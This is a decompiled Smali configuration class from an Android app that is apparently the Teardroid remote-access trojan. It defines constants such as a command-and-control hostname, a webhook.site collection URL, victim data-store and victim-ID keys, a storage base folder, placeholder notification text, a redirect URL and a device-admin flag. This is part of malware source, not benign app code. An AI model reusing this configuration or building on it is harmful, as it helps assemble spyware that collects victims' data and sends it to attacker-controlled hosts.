.class public final Lcom/example/teardroidv2/AppInfo;
.super Ljava/lang/Object;
.source "AppInfo.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\u0008\u0002\n\u0002\u0010\u000e\n\u0002\u0008\u001a\n\u0002\u0010\u000b\n\u0002\u0008\u0003\u0008\u00c6\u0002\u0018\u00002\u00020\u0001B\u0007\u0008\u0002\u00a2\u0006\u0002\u0010\u0002R\u0014\u0010\u0003\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0005\u0010\u0006R\u0014\u0010\u0007\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0008\u0010\u0006R\u0014\u0010\t\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\n\u0010\u0006R\u0014\u0010\u000b\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u000c\u0010\u0006R\u0014\u0010\r\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u000e\u0010\u0006R\u0014\u0010\u000f\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0010\u0010\u0006R\u0014\u0010\u0011\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0012\u0010\u0006R\u0014\u0010\u0013\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0014\u0010\u0006R\u0014\u0010\u0015\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0016\u0010\u0006R\u0014\u0010\u0017\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0018\u0010\u0006R\u0014\u0010\u0019\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u001a\u0010\u0006R\u0014\u0010\u001b\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u001c\u0010\u0006R\u0014\u0010\u001d\u001a\u00020\u0004X\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u001d\u0010\u0006R\u0014\u0010\u001e\u001a\u00020\u001fX\u0086D\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008 \u0010!\u00a8\u0006\""
    }
    d2 = {
        "Lcom/example/teardroidv2/AppInfo;",
        "",
        "()V",
        "DeviceBaseFolder",
        "",
        "getDeviceBaseFolder",
        "()Ljava/lang/String;",
        "FirstRunKey",
        "getFirstRunKey",
        "HOSTNAME",
        "getHOSTNAME",
        "NotificationContent",
        "getNotificationContent",
        "NotificationSubText",
        "getNotificationSubText",
        "NotificationTitle",
        "getNotificationTitle",
        "PackageName",
        "getPackageName",
        "RedirctURL",
        "getRedirctURL",
        "TAG",
        "getTAG",
        "VictimDatastore",
        "getVictimDatastore",
        "VictimID",
        "getVictimID",
        "devHostName",
        "getDevHostName",
        "isServiceRunning",
        "need_device_admin",
        "",
        "getNeed_device_admin",
        "()Z",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field private static final DeviceBaseFolder:Ljava/lang/String;

.field private static final FirstRunKey:Ljava/lang/String;

.field private static final HOSTNAME:Ljava/lang/String;

.field public static final INSTANCE:Lcom/example/teardroidv2/AppInfo;

.field private static final NotificationContent:Ljava/lang/String;

.field private static final NotificationSubText:Ljava/lang/String;

.field private static final NotificationTitle:Ljava/lang/String;

.field private static final PackageName:Ljava/lang/String;

.field private static final RedirctURL:Ljava/lang/String;

.field private static final TAG:Ljava/lang/String;

.field private static final VictimDatastore:Ljava/lang/String;

.field private static final VictimID:Ljava/lang/String;

.field private static final devHostName:Ljava/lang/String;

.field private static final isServiceRunning:Ljava/lang/String;

.field private static final need_device_admin:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lcom/example/teardroidv2/AppInfo;

    invoke-direct {v0}, Lcom/example/teardroidv2/AppInfo;-><init>()V

    sput-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    const-string v0, "Teardroid"

    .line 4
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->TAG:Ljava/lang/String;

    const-string v0, "isServiceRunning"

    .line 5
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->isServiceRunning:Ljava/lang/String;

    const-string v0, "isFirstRun"

    .line 6
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->FirstRunKey:Ljava/lang/String;

    const-string v0, "VictimInformation"

    .line 7
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->VictimDatastore:Ljava/lang/String;

    const-string v0, "VictimUUID"

    .line 8
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->VictimID:Ljava/lang/String;

    const-string v0, "/storage/emulated/0/"

    .line 9
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->DeviceBaseFolder:Ljava/lang/String;

    const-string v0, "com.example.teardroidv2"

    .line 10
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->PackageName:Ljava/lang/String;

    const-string v0, "https://webhook.site/de799e0c-da90-4438-af38-7227c1cfb6c2"

    .line 11
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->devHostName:Ljava/lang/String;

    const-string v0, "https://hellokitty-1-j8034997.deta.app"

    .line 12
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->HOSTNAME:Ljava/lang/String;

    const-string v0, "gfdg"

    .line 13
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationTitle:Ljava/lang/String;

    const-string v0, "dfgfd"

    .line 14
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationContent:Ljava/lang/String;

    const-string v0, "gfdg"

    .line 15
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationSubText:Ljava/lang/String;

    const-string v0, "https://dropbox.com"

    .line 16
    sput-object v0, Lcom/example/teardroidv2/AppInfo;->RedirctURL:Ljava/lang/String;

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    .line 3
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final getDevHostName()Ljava/lang/String;
    .locals 1

    .line 11
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->devHostName:Ljava/lang/String;

    return-object v0
.end method

.method public final getDeviceBaseFolder()Ljava/lang/String;
    .locals 1

    .line 9
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->DeviceBaseFolder:Ljava/lang/String;

    return-object v0
.end method

.method public final getFirstRunKey()Ljava/lang/String;
    .locals 1

    .line 6
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->FirstRunKey:Ljava/lang/String;

    return-object v0
.end method

.method public final getHOSTNAME()Ljava/lang/String;
    .locals 1

    .line 12
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->HOSTNAME:Ljava/lang/String;

    return-object v0
.end method

.method public final getNeed_device_admin()Z
    .locals 1

    .line 17
    sget-boolean v0, Lcom/example/teardroidv2/AppInfo;->need_device_admin:Z

    return v0
.end method

.method public final getNotificationContent()Ljava/lang/String;
    .locals 1

    .line 14
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationContent:Ljava/lang/String;

    return-object v0
.end method

.method public final getNotificationSubText()Ljava/lang/String;
    .locals 1

    .line 15
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationSubText:Ljava/lang/String;

    return-object v0
.end method

.method public final getNotificationTitle()Ljava/lang/String;
    .locals 1

    .line 13
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->NotificationTitle:Ljava/lang/String;

    return-object v0
.end method

.method public final getPackageName()Ljava/lang/String;
    .locals 1

    .line 10
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->PackageName:Ljava/lang/String;

    return-object v0
.end method

.method public final getRedirctURL()Ljava/lang/String;
    .locals 1

    .line 16
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->RedirctURL:Ljava/lang/String;

    return-object v0
.end method

.method public final getTAG()Ljava/lang/String;
    .locals 1

    .line 4
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->TAG:Ljava/lang/String;

    return-object v0
.end method

.method public final getVictimDatastore()Ljava/lang/String;
    .locals 1

    .line 7
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->VictimDatastore:Ljava/lang/String;

    return-object v0
.end method

.method public final getVictimID()Ljava/lang/String;
    .locals 1

    .line 8
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->VictimID:Ljava/lang/String;

    return-object v0
.end method

.method public final isServiceRunning()Ljava/lang/String;
    .locals 1

    .line 5
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->isServiceRunning:Ljava/lang/String;

    return-object v0
.end method
